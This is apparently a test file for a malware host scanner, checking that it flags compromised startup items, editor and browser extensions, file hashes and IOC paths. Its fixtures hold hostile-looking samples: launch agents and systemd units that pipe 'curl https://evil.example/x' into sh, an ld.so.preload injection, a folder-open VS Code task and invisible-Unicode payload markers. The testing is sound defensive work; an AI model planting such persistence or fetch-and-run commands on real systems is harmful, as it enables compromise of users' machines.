import { createHash } from "node:crypto";
import { chmodSync, mkdirSync, truncateSync, utimesSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import type { Runner } from "../src/runner.js";
import { scanHost } from "../src/scan/host.js";
import { walk } from "../src/scan/walk.js";
import type { IocFile } from "../src/types.js";
import { AIKIDO_IOCS, tmp } from "./helpers.js";

const NOW = new Date("2026-11-12T12:00:00Z");
const OLD = new Date("2025-01-01T00:00:00Z");
const none: Runner = async () => ({ ok: false, status: 1, stdout: "", stderr: "", missing: true });
const C0 = AIKIDO_IOCS.campaigns[0] as IocFile["campaigns"][0];
const withIndicators = (indicators: IocFile["campaigns"][0]["indicators"]): IocFile => ({ campaigns: [{ ...C0, indicators }] });

function put(root: string, rel: string, body: string, mtime?: Date) {
  const p = join(root, rel);
  mkdirSync(join(p, ".."), { recursive: true });
  writeFileSync(p, body);
  if (mtime) utimesSync(p, mtime, mtime);
  return p;
}
const titles = (r: { findings: { severity: string; title: string }[] }) => r.findings.map((f) => `${f.severity}: ${f.title}`);

describe("file IOCs where the walk does not go (machine-1, cov-5)", () => {
  it("finds home paths, absolute paths, folders, bare names in drop folders, and package folders", async () => {
    const home = tmp("ug-fio-");
    const drop = join(home, "droptmp");
    put(home, "Library/LaunchAgents/com.evil.updater.plist", "<plist/>");
    put(home, ".local/share/kitty/cat.py", "x");
    put(home, ".dev-env/config.sh", "x");
    put(home, ".config/sysmon/sysmon.py", "x");
    put(home, "Library/Application Support/evilcorp/agent.bin", "x");
    put(drop, "inventory.txt", "x");
    put(drop, "sub/.sysupdate", "x");
    put(home, "code/app/node_modules/pkg/bun_environment.js", "x");
    put(home, "code/app/.git/config", "");
    const iocs = withIndicators(
      [
        "com.evil.updater.plist",
        "~/.local/share/kitty/cat.py",
        "$HOME/.dev-env/",
        "/Users/victim/.config/sysmon/sysmon.py",
        "Library/Application Support/evilcorp/agent.bin",
        `${drop}/inventory.txt`,
        ".sysupdate",
        "bun_environment.js",
      ].map((value) => ({ type: "file" as const, value, source: "S1" })),
    );
    const r = await scanHost(iocs, walk([join(home, "code")]), none, {
      home,
      startupDirs: [join(home, "Library/LaunchAgents")],
      dropDirs: [drop],
      skipLive: true,
      now: NOW,
    });
    const subjects = r.findings.filter((f) => f.indicator?.type === "file").map((f) => f.subject.slice(home.length + 1));
    expect(subjects.sort()).toEqual(
      [
        "Library/LaunchAgents/com.evil.updater.plist",
        ".local/share/kitty/cat.py",
        ".dev-env",
        ".config/sysmon/sysmon.py",
        "Library/Application Support/evilcorp/agent.bin",
        "droptmp/inventory.txt",
        "droptmp/sub/.sysupdate",
        "code/app/node_modules/pkg/bun_environment.js",
      ].sort(),
    );
    expect(titles(r)).toContain(`compromised: Folder ${join(home, ".dev-env")} matches "$HOME/.dev-env/"`);
  });
});

describe("startup items (machine-2, 3, 9, 10, 12, 23)", () => {
  it("reads entity-encoded commands, scripts with spaces, #! programs, big plists, backdated items and Apple look-alikes", async () => {
    const home = tmp("ug-st-");
    const la = join(home, "LA");
    put(
      home,
      "LA/com.user.helper.plist",
      "<key>ProgramArguments</key><array><string>&#47;bin&#47;sh</string><string>-c</string><string>c&#117;rl -s https://evil.example/x &#124; sh</string></array>",
      OLD,
    );
    const spaced = put(home, "Library/Application Support/com.apple.sysd/update.sh", "#!/bin/sh\ncurl -s https://e.example/x | sh\n");
    put(
      home,
      "LA/com.apple.sysd.plist",
      `<key>Label</key><string>com.apple.sysd</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>${spaced}</string></array>`,
      OLD,
    );
    const direct = put(home, "Library/Helpers/agent.sh", "#!/bin/sh\ncurl -s https://e.example/x | sh\n");
    chmodSync(direct, 0o755);
    put(home, "LA/com.user.direct.plist", `<key>ProgramArguments</key><array><string>${direct}</string></array>`, OLD);
    put(home, "LA/com.user.big.plist", `<key>Program</key><string>/usr/bin/true</string><!-- ${"x".repeat(2.2 * 1024 * 1024)} -->`, OLD);
    put(home, "LA/com.user.cdata.plist", "<key>ProgramArguments</key><array><string><![CDATA[/tmp/.x/agent]]></string></array>", OLD);
    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "nothing")]), none, { home, startupDirs: [la], dropDirs: [], skipLive: true, now: NOW });
    const t = titles(r);
    const find = (name: string) => t.find((x) => x.includes(name)) ?? "";
    expect(find("com.user.helper.plist")).toMatch(/^suspicious: Risky startup item.*downloads and runs a script/);
    expect(find("com.apple.sysd.plist")).toMatch(/named like an Apple service.*its script update\.sh downloads and runs a script/);
    expect(find("com.user.direct.plist")).toMatch(/its script agent\.sh downloads and runs a script/);
    expect(find("com.user.big.plist")).toMatch(/^suspicious: Startup item com\.user\.big\.plist is 2\.\d MB and could not be read/);
    expect(find("com.user.cdata.plist")).toMatch(/temporary or shared folder \(\/tmp\/\.x\/agent\)/);
  });

  it("an item whose date was set back is still recent, by its change time (machine-9)", async () => {
    const home = tmp("ug-st2-");
    put(home, "LA/com.backdated.plist", "<key>Program</key><string>/usr/local/bin/x</string>", new Date("2024-01-01"));
    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "nothing")]), none, { home, startupDirs: [join(home, "LA")], dropDirs: [], skipLive: true });
    expect(titles(r).find((x) => x.includes("com.backdated.plist"))).toMatch(/was written recently \(changed on .*, dated 2024-01-01\)/);
  });

  it("a com.apple label is not excused by the Apple signature of the interpreter it runs (machine-10)", async () => {
    const home = tmp("ug-st3-");
    const script = put(home, "s/run.sh", "#!/bin/sh\necho hi\n");
    put(
      home,
      "LA/com.apple.x.plist",
      `<key>Label</key><string>com.apple.x</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>${script}</string></array>`,
      OLD,
    );
    const signed: Runner = async (cmd) =>
      cmd === "codesign"
        ? { ok: true, status: 0, stdout: "", stderr: "Authority=Software Signing\n" }
        : { ok: false, status: 1, stdout: "", stderr: "", missing: true };
    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "nothing")]), signed, {
      home,
      platform: "darwin",
      startupDirs: [join(home, "LA")],
      dropDirs: [],
      av: "off",
      now: NOW,
    });
    expect(titles(r).find((x) => x.includes("com.apple.x.plist"))).toMatch(/named like an Apple service \(com\.apple\.x\)/);
  });

  it("Linux: every Exec line and drop-in folders are read, and ld.so.preload is a signal (machine-23)", async () => {
    const home = tmp("ug-st4-");
    put(home, "units/sync.service", "[Service]\nExecStart=/bin/true\nExecStartPre=/bin/sh -c 'curl -s https://e.example/x | sh'\n", OLD);
    put(home, "units/ssh-agent.service.d/override.conf", "[Service]\nExecStartPost=/tmp/.x/agent\n", OLD);
    put(home, "etc/ld.so.preload", "/usr/lib/libevil.so\n", OLD);
    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "nothing")]), none, {
      home,
      platform: "linux",
      startupDirs: [join(home, "units"), join(home, "etc/ld.so.preload")],
      dropDirs: [],
      skipLive: true,
      now: NOW,
    });
    const t = titles(r);
    expect(t.find((x) => x.includes("sync.service"))).toMatch(/downloads and runs a script/);
    expect(t.find((x) => x.includes("override.conf"))).toMatch(/temporary or shared folder/);
    expect(t.find((x) => x.includes("ld.so.preload"))).toMatch(/preloads \/usr\/lib\/libevil\.so into every program/);
  });
});

describe("VS Code folder-open tasks (machine-21)", () => {
  it("quotes the task that runs on open, with its signals", async () => {
    const home = tmp("ug-vs-");
    put(
      home,
      "code/app/.vscode/tasks.json",
      JSON.stringify({
        tasks: [
          { label: "build", command: "npm run build" },
          { label: "init", command: "node", args: [".vscode/setup.mjs"], runOptions: { runOn: "folderOpen" } },
        ],
      }),
    );
    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "code")]), none, { home, startupDirs: [], dropDirs: [], skipLive: true, now: NOW });
    expect(titles(r)).toContain("suspicious: VS Code task runs automatically when the folder opens: init: node .vscode/setup.mjs");
  });
});

describe("hashes (machine-22, machine-29)", () => {
  it("a large file named like an IOC is hashed, not dismissed", async () => {
    const home = tmp("ug-big-");
    const p = put(home, "bin/stealer-darwin-arm64", "");
    truncateSync(p, 60 * 1024 * 1024);
    const iocs = withIndicators([
      { type: "file", value: "stealer-darwin-arm64", source: "S1" },
      { type: "sha256", value: "a".repeat(64), source: "S1" },
    ]);
    const r = await scanHost(iocs, walk([home]), none, { home, startupDirs: [], dropDirs: [], skipLive: true, now: NOW });
    const f = r.findings.find((x) => x.subject === p);
    expect(f?.title).toMatch(/but its sha256 matches none of the campaign's 1 hash\(es\)/);
    expect(f?.evidence.excerpt).toMatch(/^sha256=[0-9a-f]{64}$/);
  });

  it.skipIf(process.getuid?.() === 0)("a file named like an IOC that cannot be read stays a compromise and says why", async () => {
    const home = tmp("ug-unr-");
    const p = put(home, "bin/stealer-darwin-arm64", "x");
    chmodSync(p, 0o000);
    const iocs = withIndicators([
      { type: "file", value: "stealer-darwin-arm64", source: "S1" },
      { type: "sha256", value: "a".repeat(64), source: "S1" },
    ]);
    const r = await scanHost(iocs, walk([home]), none, { home, startupDirs: [], dropDirs: [], skipLive: true, now: NOW });
    chmodSync(p, 0o600);
    expect(titles(r)).toContain(`compromised: File ${p} matches "stealer-darwin-arm64" (sha256 not computed: the file could not be read)`);
  });

  it("hashes the program a startup item runs and recent files in drop folders", async () => {
    const home = tmp("ug-hash2-");
    const body = "renamed dropper";
    const digest = createHash("sha256").update(body).digest("hex");
    const prog = put(home, "opt/helper", body);
    put(home, "LA/com.x.plist", `<key>Program</key><string>${prog}</string>`, OLD);
    const dl = put(home, "Downloads/invoice.pdf.app", body);
    const iocs = withIndicators([{ type: "sha256", value: digest, source: "S1" }]);
    const r = await scanHost(iocs, walk([join(home, "nothing")]), none, {
      home,
      startupDirs: [join(home, "LA")],
      dropDirs: [join(home, "Downloads")],
      skipLive: true,
      now: new Date(),
    });
    const t = titles(r);
    expect(t.some((x) => x.startsWith("compromised: Startup item") && x.includes("matches the sha256"))).toBe(true);
    expect(t).toContain(`compromised: File ${dl} matches the sha256`);
  });
});

describe("live state (machine-8, machine-20)", () => {
  it("keeps every crontab line in the inventory and says lsof sees only this user's sockets", async () => {
    const home = tmp("ug-live-");
    const runner: Runner = async (cmd) => {
      if (cmd === "crontab") return { ok: true, status: 0, stdout: "# m h\n@reboot /usr/local/bin/backup\n", stderr: "" };
      if (cmd === "lsof") return { ok: true, status: 0, stdout: "COMMAND PID\n", stderr: "" };
      return { ok: false, status: 1, stdout: "", stderr: "", missing: true };
    };
    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "nothing")]), runner, {
      home,
      platform: "darwin",
      startupDirs: [],
      dropDirs: [],
      av: "off",
      now: NOW,
    });
    expect(r.inventory.crontab).toEqual(["@reboot /usr/local/bin/backup"]);
    if (process.getuid?.() !== 0) expect(r.gaps.some((g) => g.what.startsWith("connections of processes owned by other users"))).toBe(true);
  });
});

describe("one malformed agent config (machine-4)", () => {
  it("does not stop the host scan", async () => {
    const home = tmp("ug-mcp-");
    put(home, "code/repo/.git/config", "");
    put(home, "code/repo/.mcp.json", JSON.stringify({ mcpServers: { a: { command: ["node", "server.js"] }, b: { command: 42 } } }));
    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "code")]), none, { home, startupDirs: [], dropDirs: [], skipLive: true, now: NOW });
    expect(r.inventory.agents?.mcpServers.map((s) => [s.name, s.command])).toEqual([
      ["a", "node"],
      ["b", undefined],
    ]);
  });
});

describe("editor and browser extensions (cov-10, cov-13, cov-14)", () => {
  it("matches extensions in any editor fork, invisible payloads in extension code, and browser extension IOCs", async () => {
    const home = tmp("ug-ext2-");
    put(home, ".antigravity/extensions/evil.glassworm-1.2.3/package.json", "{}");
    put(home, ".vscode/extensions/odd.thing-1.0.0/package.json", JSON.stringify({ main: "./out/extension" }));
    put(home, ".vscode/extensions/odd.thing-1.0.0/out/extension.js", `const a = 1;${"\u{E0101}".repeat(40)}`);
    const id = "egjidjbpglichdcondbcbdnbeeppgdph";
    mkdirSync(join(home, `Library/Application Support/Google/Chrome/Profile 1/Extensions/${id}/2.68_0`), { recursive: true });
    const iocs = withIndicators([
      { type: "package", ecosystem: "vscode", value: "evil.glassworm", source: "S1" },
      { type: "package", ecosystem: "chrome", value: id, versions: ["2.68"], source: "S1" },
    ]);
    const r = await scanHost(iocs, walk([join(home, "nothing")]), none, { home, platform: "darwin", startupDirs: [], dropDirs: [], skipLive: true, now: NOW });
    const t = titles(r);
    expect(t).toContain("compromised: Editor extension evil.glassworm@1.2.3 is installed");
    expect(t.some((x) => x.startsWith("suspicious: Editor extension odd.thing@1.0.0 hides a run of invisible Unicode variation selectors"))).toBe(true);
    expect(t).toContain(`compromised: Chrome extension ${id}@2.68 is installed (profile Profile 1)`);
    expect(r.gaps.some((g) => g.what.includes("browser extensions"))).toBe(false);
  });
});

describe("ultraguard's own folders are never findings (machine-5, e2e-8)", () => {
  it("drops YARA matches on the run folder and the rules folder", async () => {
    const home = tmp("ug-self-");
    const run = join(home, "Downloads/ug-run");
    put(run, "sources/S1.md", "wfx stealer string");
    put(run, "yara/wfx.yar", 'rule wfx_stealer { strings: $a = "wfx stealer" condition: $a }');
    const state = join(home, ".ultraguard");
    put(state, "rules/yara-forge-core.yar", "rule X { condition: true }");
    put(state, "rules/yara-forge-core.yarc", "compiled");
    put(home, "Downloads/real.bin", "x");
    const calls: string[][] = [];
    const runner: Runner = async (cmd, args) => {
      calls.push([cmd, ...args]);
      if (cmd !== "yara") return { ok: false, status: 1, stdout: "", stderr: "", missing: true };
      return {
        ok: true,
        status: 0,
        stdout: [
          `wfx_stealer ${run}/sources/S1.md`,
          `wfx_stealer ${run}/iocs.json`,
          `X [score=80] ${state}/rules/yara-forge-core.yar`,
          `wfx_stealer ${home}/Downloads/real.bin`,
        ].join("\n"),
        stderr: "",
      };
    };
    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "nothing")]), runner, {
      home,
      startupDirs: [],
      dropDirs: [join(home, "Downloads")],
      av: "off",
      now: new Date(),
      listDir: run,
      stateDir: state,
      yara: join(run, "yara"),
      yaraSource: "S1",
      community: {
        source: join(state, "rules/yara-forge-core.yar"),
        compiled: join(state, "rules/yara-forge-core.yarc"),
        label: "YARA-Forge core",
        ageDays: 1,
      },
    });
    expect(r.findings.filter((f) => f.title.includes("rule")).map((f) => f.subject)).toEqual([`${home}/Downloads/real.bin`, `${home}/Downloads/real.bin`]);
    const list = calls.find((c) => c[0] === "yara")?.at(-1) ?? "";
    expect(list.startsWith(run)).toBe(true);
  });
});
